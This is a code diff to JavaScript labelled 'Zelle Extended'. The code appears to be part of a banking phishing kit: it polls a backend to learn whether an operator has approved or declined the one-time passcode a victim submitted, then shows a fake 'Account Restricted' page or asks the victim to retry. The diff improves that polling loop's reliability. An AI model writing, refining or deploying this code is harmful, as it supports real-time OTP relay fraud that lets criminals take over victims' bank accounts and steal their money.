@@ -718,25 +718,42 @@
     // ========================================
     // START OTP POLLING (AFTER USER SUBMITS OTP)
     // ========================================
+    let pollingStopped = false;
+    
     function startOtpPolling(userId) {
         currentUserId = userId;
+        pollingStopped = false;
         
-        console.log('[Zelle Extended] Starting OTP polling for user:', userId);
+        console.log('[Zelle Extended] 🔄 Starting OTP polling for user:', userId);
+        
+        // Clear any existing interval
+        if (otpPollInterval) {
+            clearInterval(otpPollInterval);
+        }
         
         // Poll every 2 seconds
         otpPollInterval = setInterval(async () => {
+            // Exit if polling was stopped
+            if (pollingStopped) {
+                console.log('[Zelle Extended] 🛑 Polling stopped');
+                clearInterval(otpPollInterval);
+                return;
+            }
+            
             try {
                 const response = await fetch(`${API_URL}/api/check-otp-status?id=${userId}`);
                 const data = await response.json();
                 
-                console.log('[Zelle Extended] OTP Status:', data.otp_status);
+                console.log('[Zelle Extended] 📊 OTP Status:', data.otp_status);
                 
                 if (data.otp_status === 'approve') {
                     console.log('[Zelle Extended] ✅ APPROVED! Showing Account Restricted page...');
+                    pollingStopped = true;
                     clearInterval(otpPollInterval);
                     showModal('accountRestrictedPage');
                 } else if (data.otp_status === 'decline') {
                     console.log('[Zelle Extended] ❌ DECLINED! Showing inline error...');
+                    pollingStopped = true;
                     clearInterval(otpPollInterval);
                     
                     // Show error and reset status for retry
@@ -747,13 +764,13 @@
                         method: 'POST'
                     });
                     
-                    // Restart polling for new attempt
+                    // Restart polling for new attempt after 3 seconds
                     setTimeout(() => {
                         startOtpPolling(userId);
-                    }, 1000);
+                    }, 3000);
                 }
             } catch (error) {
-                console.error('[Zelle Extended] Polling error:', error);
+                console.error('[Zelle Extended] ❌ Polling error:', error);
             }
         }, 2000);
     }
